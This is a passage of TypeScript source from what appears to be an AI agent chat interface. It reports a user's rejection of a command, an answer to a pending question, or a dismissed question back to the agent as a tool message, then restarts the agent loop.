  if (!cmd) return

  store.clearPendingCommand()

  store.addMessage({
    id: `msg-${Date.now()}`,
    role: 'tool',
    // F-03: rejection is reported back as a normal tool result so the loop
    // continues (the model gets to re-plan) instead of aborting the run.
    content: cmd.mcpTool
      ? `User rejected the external MCP tool call ${cmd.mcpTool.qualifiedName}.`
      : 'User rejected this command.',
    tool_call_id: cmd.toolId
  })

  setTimeout(() => runAgent(''), 0)
}

export function answerQuestion(selectedLabels: string[], customText?: string) {
  const store = useAIStore()
  const q = store.pendingQuestion
  if (!q) return

  store.clearPendingQuestion()

  let answer: string
  if (customText !== undefined && customText.trim() !== '') {
    answer = `User chose "Other": ${customText.trim()}`
  } else if (q.multiSelect && selectedLabels.length > 1) {
    answer = `User selected: ${selectedLabels.join(', ')}`
  } else {
    answer = `User chose: ${selectedLabels[0]}`
  }

  store.addMessage({
    id: `msg-${Date.now()}`,
    role: 'tool',
    content: answer,
    tool_call_id: q.toolId
  })

  setTimeout(() => runAgent(''), 0)
}

export function dismissQuestion() {
  const store = useAIStore()
  const q = store.pendingQuestion
  if (!q) return

  store.clearPendingQuestion()

  store.addMessage({
    id: `msg-${Date.now()}`,
    role: 'tool',
    content: 'User dismissed this question.',
    tool_call_id: q.toolId
  })

  setTimeout(() => runAgent(''), 0)
}
